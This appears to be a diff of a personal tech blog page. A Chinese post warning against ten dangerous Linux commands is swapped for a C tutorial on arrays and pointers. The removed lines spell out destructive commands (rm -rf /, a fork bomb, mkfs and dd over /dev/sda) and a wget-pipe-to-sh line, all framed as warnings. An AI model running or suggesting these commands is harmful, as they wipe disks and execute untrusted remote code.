@@ -4,11 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Linux 10个危险的命令, C++ Linux PRC Go Docker">
+    <meta name="keywords" content="数组, C++ Linux PRC Go Docker">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破">
+    <meta name="description" content="前言在C语言中，数组和指针似乎总是“暧昧不清”，有时候很容易把它们混淆。本文就来理一理数组和指针之间到底有哪些异同。
+数组回顾在分析之前，我们不妨回顾一下数组的知识。数组是可以存储一个固定大小的相同类型元素的顺序集合。为了便于我们说明，假设">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Linux 10个危险的命令 | 吴杭沉的博客</title>
+    <title>数组 | 吴杭沉的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -266,13 +267,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/27.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Linux 10个危险的命令
+                        数组
                     </div>
                 </div>
             </div>
@@ -383,8 +384,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/Linux/" target="_blank">
-                            <span class="chip bg-color">Linux</span>
+                        <a href="/tags/C/" target="_blank">
+                            <span class="chip bg-color">C++</span>
                         </a>
                         
                     </div>
@@ -395,8 +396,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/Linux/" class="post-category" target="_blank">
-                            Linux
+                        <a href="/categories/C/" class="post-category" target="_blank">
+                            C++
                         </a>
                         
                     </div>
@@ -407,7 +408,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-07-28
+                    2024-08-14
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -444,18 +445,71 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。<br>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。<br>当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p>
-<h1 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h1><p>rm -rf命令是删除文件夹及其内容最快的方式之一。<br>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些rm 命令的选项：<br>    • rm　命令在Linux下通常用来删除文件。<br>    • rm -r 命令递归的删除文件夹，甚至是空的文件夹<br>    • rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。<br>    • rm -rf / : 强制删除根目录下所有东东。<br>    • rm -rf *:　强制删除当前目录的所有文件。<br>    • rm -rf . : 强制删除当前文件夹及其子文件夹。<br>从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p>
-<h1 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){:|:&amp;};: 命令"></a>:(){:|:&amp;};: 命令</h1><p>这就是个fork 炸弹的实例。<br>具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p>
-<h1 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令　&gt; /dev/sda"></a>命令　&gt; /dev/sda</h1><p>这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。<br>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p>
-<h1 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h1><p>这个命令会移动某个‘文件夹‘到/dev/null。<br>在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p>
-<h1 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h1><p>该命令会从一个（也许是）恶意源下载一个脚本并执行。<br>Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。<br>注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p>
-<h1 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h1><p>上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。<br>通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。<br>一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。</p>
-<h1 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h1><p>这个命令常用来清空文件内容或记录命令输出。<br>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。<br>你可能真正想用的是“&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。<br>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。</p>
-<h1 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h1><p>这个命令用来编辑先前运行的命令而无需重打整个命令。<br>用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p>
-<h1 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h1><p>这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。<br>记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p>
-<h1 id="隐藏命令"><a href="#隐藏命令" class="headerlink" title="隐藏命令"></a>隐藏命令</h1><p>下面的命令其实就是上面第一个命令 (rm -rf)。<br>这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。<br>真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。<br>切记，千万不要编译／运行从未知来源的代码。</p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在C语言中，数组和指针似乎总是“暧昧不清”，有时候很容易把它们混淆。本文就来理一理数组和指针之间到底有哪些异同。</p>
+<h1 id="数组回顾"><a href="#数组回顾" class="headerlink" title="数组回顾"></a>数组回顾</h1><p>在分析之前，我们不妨回顾一下数组的知识。数组是可以存储一个固定大小的相同类型元素的顺序集合。为了便于我们说明，<br>假设有以下数组声明：</p>
+<pre><code>int a[5];
+char b[] = &quot;hello&quot;;</code></pre><p>数组大小必须在编译期就作为一个常数确定下来。<br>但C99中引入了变长数组，允许数组的维度是表达式 ，但在数组分配内存时，其表达式的值可以被求出。<br>数组下标运算实际上都是通过指针进行的，也就是说a[4]与*(a+4)是等价的，甚至你会发现和4[a]也是一样的。<br>数组名一般代表了指向该数组下标为0的元素的指针，并且printf(“%s\n”, b)与printf(“%s\n”,&amp;b[0])等效。</p>
+<h1 id="数组和指针不相等"><a href="#数组和指针不相等" class="headerlink" title="数组和指针不相等"></a>数组和指针不相等</h1><p>考虑下面的声明：</p>
+<pre><code>int c[4]；//假设int占4字节
+int *d;</code></pre><p>对于上面的声明，编译器会给c预留内存空间4*4字节，并且数组名代表着指向数组第一个元素的指针。但对于d，却只为指针本身保留了内存空间。<br>所以此时有下面的操作：</p>
+<pre><code>c[3];        //合法
+*(c+3);      //合法
+*d;          //不合法，d指向了内存中不确定位置
+c++；        //不合法，一维数组名是指针常量，常量不能被修改掉
+d++；        //可通过编译</code></pre><p>另外，下面的两种情况也是不一样的：</p>
+<pre><code>char c[] = &quot;hello&quot;;
+char *d = &quot;hello&quot;;</code></pre><p>前者对字符数组c进行了初始化，后者将d指向了字符串常量。字符串常量存储在只读区，因此有下面的操作：</p>
+<pre><code>c[0] = &#39;H&#39;;  //合法，可修改数组内容
+*d = &#39;H&#39;;    //不合法，字符串常量内容不可更改
+d[0] = &#39;H&#39;   //不合法</code></pre><h1 id="数组名的含义"><a href="#数组名的含义" class="headerlink" title="数组名的含义"></a>数组名的含义</h1><p>绝大多数情况，数组名都代表着指向该数组中下标为0的元素的指针，但是有例外：</p>
+<pre><code>int e[4];//假设int为4字节
+sizeof(e);</code></pre><p>上面的sizeof(e)的值并非4或8（指针占用空间），而是4*4 = 16。也就是说，当数组名被用作运算符sizeof的参数时，<br>它的计算结果是整个数组的大小，而非第一个元素的指针大小。再来看下面这种情况：</p>
+<pre><code>int temp[5];
+char *p = &amp;temp;
+char *q = temp;</code></pre><p>在这里，p和q的值是一样的，含义却不一样，前者是指向数组的指针，而后者是指向该数组中下标为0的元素的指针。<br>因此p+1指向了temp的末尾，而q+1指向了temp的第2个元素。</p>
+<h1 id="数组长度计算"><a href="#数组长度计算" class="headerlink" title="数组长度计算"></a>数组长度计算</h1><p>如何计算数组长度？考虑下面的代码：</p>
+<pre><code>int f[] = {1,2,3,4,5,6};
+int *g = f;
+size_t len_f = sizeof(f)/sizeof(int)//正确计算方法
+size_t len_g = sizeof(g)/sizeof(int)</code></pre><p>上面的len_f和len_g的值相等吗？显然并不相等。事实上，只有len_f得到了数组f的长度，而len_g的值并没有任何实际意义。</p>
+<h1 id="不能作为参数的数组"><a href="#不能作为参数的数组" class="headerlink" title="不能作为参数的数组"></a>不能作为参数的数组</h1><p>所谓的数组不能作为参数，并不是指声明的数组不能作为参数传递，而是指当数组名作为参数时，数组名会被转换为指向该数组下标为0的元素的指针。<br>而下面的两种声明，其实也是等效的：</p>
+<pre><code>size_t arrayLen(const int *arr);
+size_t arrayLen(const int arr[]);</code></pre><p>我们来看一个例子，说明数组作为参数的情况：</p>
+<pre><code>#include &lt;stdio.h&gt;
+int arraySum(const int arr[])
+{
+    unsigned int loop = 0;
+    /*循环前计算好长度，提高性能*/
+    unsigned int len = sizeof(arr)/sizeof(int);
+    int sum = 0;
+    if(NULL == arr)
+    {
+        return 0;
+    }
+    for(loop = 0; loop &lt; len; loop++)
+    {
+        sum+=arr[loop];
+    }
+    return sum;
+}
+int main()
+{
+    int a[] = {1,2,3,4,5,6};
+    int sum = arraySum(a);
+    printf(&quot;arr sum is %d&quot;,sum);
+    return 0;
+}</code></pre><p>我们运行上面的程序，发现最终结果并不是我们预期的21，而是3。问题在于，a作为参数传入到arraySum中时，它是作为指针的，那么在函数内部计算sizeof(arr)自然只是得到了指针占用的内存大小。<br>对于64位程序，这个大小是8，那么len的值为2，最终只计算了两个元素的和。</p>
+<h2 id="思考：该如何修改上面的程序才能得到正确的结果？"><a href="#思考：该如何修改上面的程序才能得到正确的结果？" class="headerlink" title="思考：该如何修改上面的程序才能得到正确的结果？"></a>思考：该如何修改上面的程序才能得到正确的结果？</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我们来总结一下前面的核心内容：<br>    • 数组下标运算实际上都是通过指针进行的。<br>    • 数组名代表着指向该数组中下标为0的元素的指针，但有例外：sizeof(数组名)返回整个数组的大小，而非指针大小；&amp;数组名返回一个指向数组的指针，而不是指向该数组中下标为0的元素的指针的指针。<br>    • 数组名作为参数时，数组名会被转换成指向该数组下标为0的元素的指针。<br>    • 指针操作可能比下标操作效率高，但可维护性却不一定有下标操作好。<br>    • 数组和指针不相等。</p>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>下面的代码输出结果是什么？</p>
+<pre><code>#include&lt;stdio.h&gt;
+int main()
+{
 
+    int a[5] = {1,2,3,4,5};
+    int *p = (int*)(&amp;a+1);
+    printf(&quot;%d,%d&quot;,*(a+1),*(p-1));
+    return 0;
+}</code></pre>
             </div>
             <hr />
 
@@ -489,9 +543,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Linux 10个危险的命令》
+                    《数组》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2024/07/28/fourteen/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2024/08/14/twentythree/" property="cc:attributionName"
                rel="cc:attributionURL">
                 吴杭沉
             </a> 采用
@@ -532,7 +586,7 @@
         repo: 'wuhangchen.github.io',
         owner: 'wuhangchen',
         admin: "wuhangchen",
-        id: '2024/07/28/fourteen/',
+        id: '2024/08/14/twentythree/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -815,47 +869,49 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2024/07/29/fifteen/">
+                <a href="/2024/08/14/twentythree/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="Linux grep 文本查找">
+                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="数组">
                         
-                        <span class="card-title">Linux grep 文本查找</span>
+                        <span class="card-title">数组</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            之前介绍过很多linux下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令–grep。常见用法我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：
-$ ps -ef|gr
+                            前言在C语言中，数组和指针似乎总是“暧昧不清”，有时候很容易把它们混淆。本文就来理一理数组和指针之间到底有哪些异同。
+数组回顾在分析之前，我们不妨回顾一下数组的知识。数组是可以存储一个固定大小的相同类型元素的顺序集合。为了便于我们说明，假设
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-08-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Linux/" class="post-category" target="_blank">
-                                    Linux
+                            <a href="/categories/C/" class="post-category" target="_blank">
+                                    C++
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/" target="_blank">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/C/" target="_blank">
+                        <span class="chip bg-color">C++</span>
                     </a>
                     
                 </div>
@@ -869,31 +925,32 @@ $ ps -ef|gr
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/07/28/thirteen/">
+                <a href="/2024/08/14/twentytwo/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Linux Shell一些快捷键">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="语言链接">
                         
-                        <span class="card-title">Linux Shell一些快捷键</span>
+                        <span class="card-title">语言链接</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctrl+a:光标移到行首。ctrl+e:光标移到行尾。ctrl+b:光标左移一个字母, 向行首移动一个字符ctrl+f:光标右移,向行尾移动一个字符ctrl+c:杀死当前进程。ctrl+d:退出当前 Shell,从Shell提示中注销并关
+                            提供以不同程序语言编写的模块间的连接。extern 字符串字面量 { 声明序列(可选) }     (1)extern 字符串字面量 声明     (2)
+1) 将语言说明 字符串字面量 应用到声明于 声明序列 中的所有函数类型，具有外部连
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-08-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Linux/" class="post-category" target="_blank">
-                                    Linux
+                            <a href="/categories/C/" class="post-category" target="_blank">
+                                    C++
                                 </a>
                             
                             
@@ -903,8 +960,8 @@ $ ps -ef|gr
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Linux/" target="_blank">
-                        <span class="chip bg-color">Linux</span>
+                    <a href="/tags/C/" target="_blank">
+                        <span class="chip bg-color">C++</span>
                     </a>
                     
                 </div>
